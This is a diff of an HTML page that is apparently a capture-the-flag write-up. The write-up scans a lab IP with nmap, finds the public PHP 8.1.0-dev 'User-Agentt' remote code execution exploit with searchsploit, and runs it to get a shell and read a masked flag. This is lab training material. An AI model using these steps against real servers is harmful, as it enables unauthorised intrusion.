@@ -282,7 +282,7 @@
             <h2>01. Reconnaissance & Enumeration</h2>
             <p>Searching through the website directly and intercepting traffic in Burp Suite did not reveal vulnerable functional endpoints. An initial Nmap service scan was run against the target IP address:</p>
 
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code>┌──(bisc㉿kali)-[~]
  └─$ nmap -A -sC 10.113.132.144
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-15 08:07 -0400
 Nmap scan report for 10.113.132.144
@@ -296,7 +296,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
             <h2>02. Exploitation</h2>
             <p>I searched for the exploit script using <code>searchsploit</code> but you can also search it from Exploit-DB:</p>
-<pre><code>searchsploit PHP 8.1.0-dev
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ searchsploit PHP 8.1.0-dev
 
   # In the output
   PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution        | php/webapps/49933.py
@@ -304,11 +305,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
 
             <p>The exploit script can be obtained using <code>searchsploit</code> or directly downloaded from Exploit-DB:</p>
 
-<pre><code>searchsploit -m php/webapps/49933.py</code></pre>
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ searchsploit -m php/webapps/49933.py</code></pre>
 
             <p>Executing the Python script we've got against the web URL, it will give us an interactive shell session:</p>
 
-<pre><code>python 49933.py
+<pre><code>┌──(bisc㉿kali)-[~]
+ └─$ python 49933.py
 # Target URL: http://10.113.132.144/
 # Interactive shell is opened on http://10.113.132.144/
 # Can't access tty; job control turned off.</code></pre>
@@ -328,7 +331,7 @@ flag.txt  lib64</code></pre>
 
             <p>Reading <code>flag.txt</code> at the root path completes the challenge:</p>
 
-<pre><code>$ cat flag.txt
+<pre><code>$ cd ../../../ && cat flag.txt
 
 flag{412***************************cb}
 </code></pre>
